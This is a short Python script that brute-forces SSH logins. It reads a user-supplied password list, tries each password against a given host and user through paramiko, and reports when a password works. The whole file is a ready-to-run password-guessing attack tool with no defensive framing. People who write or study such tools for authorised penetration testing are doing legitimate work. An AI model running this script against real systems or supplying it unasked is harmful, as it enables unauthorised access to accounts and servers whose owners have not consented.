import argparse
import paramiko
from pwn import *

parser = argparse.ArgumentParser(description='Brute force SSH login')
parser.add_argument('--user', required=True, help='username')
parser.add_argument('--host', required=True, help='hostname or IP address')
parser.add_argument('--password-file', required=True, help='password list file')
args = parser.parse_args()

host = args.host
username = args.user
password_file = args.password_file
attempts = 0

with open (password_file, 'r') as password_list:
    for password in password_list:
        password = password.strip('\n')
        try:
            print("[{}] Attempting Password: '{}'!".format(attempts, password))
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, username=username, password=password, timeout=1)
            print("[>] Valid password found: '{}'!".format(password))
            client.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!")
        attempts += 1